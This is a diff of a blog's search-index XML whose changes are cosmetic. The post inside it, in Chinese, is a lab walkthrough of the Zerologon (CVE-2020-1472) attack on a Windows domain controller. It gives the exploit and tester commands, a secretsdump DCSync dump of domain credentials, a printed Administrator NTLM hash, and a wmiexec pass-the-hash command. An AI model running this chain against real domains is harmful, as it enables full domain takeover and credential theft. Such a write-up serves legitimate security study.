@@ -8,7 +8,7 @@
     <link href="/2024/01/08/CVE-2020-1472(Netlogon)%20/"/>
     <url>/2024/01/08/CVE-2020-1472(Netlogon)%20/</url>
     
-    <content type="html"><![CDATA[<h1 id="相关项目、EXP"><a href="#相关项目、EXP" class="headerlink" title="相关项目、EXP"></a>相关项目、EXP</h1><ul><li><a href="https://github.com/mstxq17/cve-2020-1472">https://github.com/mstxq17/cve-2020-1472</a></li></ul><p>安装依赖</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">python -m pip install -r requirement.<span class="hljs-property">txt</span><br></code></pre></td></tr></table></figure><p>检测漏洞</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">python zerologon_tester.<span class="hljs-property">py</span> <span class="hljs-variable constant_">DCNAME</span> <span class="hljs-variable constant_">DCIP</span><br></code></pre></td></tr></table></figure><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="检测漏洞"><a href="#检测漏洞" class="headerlink" title="检测漏洞"></a>检测漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python zerologon_tester.py dc01 192.168.214.200<br></code></pre></td></tr></table></figure><p>It may take a while due to the network stability</p><p><img src="https://img.tucang.cc/api/image/show/7b25e9eacd2704bfca7c7a724a367b16" alt="Untitled"></p><h2 id="EXP-指控机器账户"><a href="#EXP-指控机器账户" class="headerlink" title="EXP 指控机器账户"></a>EXP 指控机器账户</h2><p>先 dump 出结果做对比</p><p><img src="https://img.tucang.cc/api/image/show/a27bce50f8d0ef132ed5079a98de59db" alt="Untitled"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python cve-2020-1472-exploit.py dc01 192.168.214.200<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/5d904d6d57a97baf40242635630c3596" alt="Untitled"></p><p>看到 DC01 用户密码已被置空</p><p><img src="https://img.tucang.cc/api/image/show/5d44d689bf303e909a163c9e42e7ab1c" alt="Untitled"></p><p>查询验证</p><p><img src="https://img.tucang.cc/api/image/show/010ce6a8f584c5e7824dcce2a9ab9263" alt="Untitled"></p><h2 id="导出用户凭据"><a href="#导出用户凭据" class="headerlink" title="导出用户凭据"></a>导出用户凭据</h2><p>域控的机器账户可以使用 DCSync 导出域内所有用户凭据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python secretsdump.py ust4.fun/<span class="hljs-string">&#x27;DC01$&#x27;</span>@192.168.214.200 -no-pass<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/cb2bf7dfa7d3cec8aa8cdf190e6e6c34" alt="Untitled"></p><p>获得域管 Administrator 的 hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Administrator:500:aad3b435b51404eeaad3b435b51404ee:214114172ade9bb8d8feca6d765e0cf9:::<br></code></pre></td></tr></table></figure><h2 id="HASH-传递"><a href="#HASH-传递" class="headerlink" title="HASH 传递"></a>HASH 传递</h2><p>使用 wmiexec 进行 hash 传递，为了解决乱码使用 GBK 编码(-codec gbk)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:214114172ade9bb8d8feca6d765e0cf9 ust4.fun/Administrator@192.168.214.200 -codec gbk<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/2b625d5a596ad858c2ab66e3dc407a1f" alt="Untitled"></p>]]></content>
+    <content type="html"><![CDATA[<h1 id="相关项目、EXP"><a href="#相关项目、EXP" class="headerlink" title="相关项目、EXP"></a>相关项目、EXP</h1><ul><li><a href="https://github.com/mstxq17/cve-2020-1472">https://github.com/mstxq17/cve-2020-1472</a></li></ul><p>安装依赖</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">python -m pip install -r requirement.<span class="hljs-property">txt</span><br></code></pre></td></tr></table></figure><p>检测漏洞</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsx">python zerologon_tester.<span class="hljs-property">py</span> <span class="hljs-variable constant_">DCNAME</span> <span class="hljs-variable constant_">DCIP</span><br></code></pre></td></tr></table></figure><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="检测漏洞"><a href="#检测漏洞" class="headerlink" title="检测漏洞"></a>检测漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python zerologon_tester.py dc01 192.168.214.200<br></code></pre></td></tr></table></figure><p>It may take a while due to the network stability</p><p><img src="https://img.tucang.cc/api/image/show/7b25e9eacd2704bfca7c7a724a367b16" alt="Image"></p><h2 id="EXP-指控机器账户"><a href="#EXP-指控机器账户" class="headerlink" title="EXP 指控机器账户"></a>EXP 指控机器账户</h2><p>先 dump 出结果做对比</p><p><img src="https://img.tucang.cc/api/image/show/a27bce50f8d0ef132ed5079a98de59db" alt="Image"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python cve-2020-1472-exploit.py dc01 192.168.214.200<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/5d904d6d57a97baf40242635630c3596" alt="Image"></p><p>看到 DC01 用户密码已被置空</p><p><img src="https://img.tucang.cc/api/image/show/5d44d689bf303e909a163c9e42e7ab1c" alt="Image"></p><p>查询验证</p><p><img src="https://img.tucang.cc/api/image/show/010ce6a8f584c5e7824dcce2a9ab9263" alt="Image"></p><h2 id="导出用户凭据"><a href="#导出用户凭据" class="headerlink" title="导出用户凭据"></a>导出用户凭据</h2><p>域控的机器账户可以使用 DCSync 导出域内所有用户凭据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python secretsdump.py ust4.fun/<span class="hljs-string">&#x27;DC01$&#x27;</span>@192.168.214.200 -no-pass<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/cb2bf7dfa7d3cec8aa8cdf190e6e6c34" alt="Image"></p><p>获得域管 Administrator 的 hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Administrator:500:aad3b435b51404eeaad3b435b51404ee:214114172ade9bb8d8feca6d765e0cf9:::<br></code></pre></td></tr></table></figure><h2 id="HASH-传递"><a href="#HASH-传递" class="headerlink" title="HASH 传递"></a>HASH 传递</h2><p>使用 wmiexec 进行 hash 传递，为了解决乱码使用 GBK 编码(-codec gbk)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:214114172ade9bb8d8feca6d765e0cf9 ust4.fun/Administrator@192.168.214.200 -codec gbk<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/2b625d5a596ad858c2ab66e3dc407a1f" alt="Image"></p>]]></content>
     
     
     <categories>
@@ -419,9 +419,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>PHP</tag>
       
@@ -448,9 +448,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -662,9 +662,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -689,9 +689,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
@@ -770,9 +770,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
       <tag>Docker</tag>
       
@@ -799,9 +799,9 @@
     
     <tags>
       
-      <tag>CTF</tag>
-      
       <tag>Web</tag>
+      
+      <tag>CTF</tag>
       
     </tags>
     
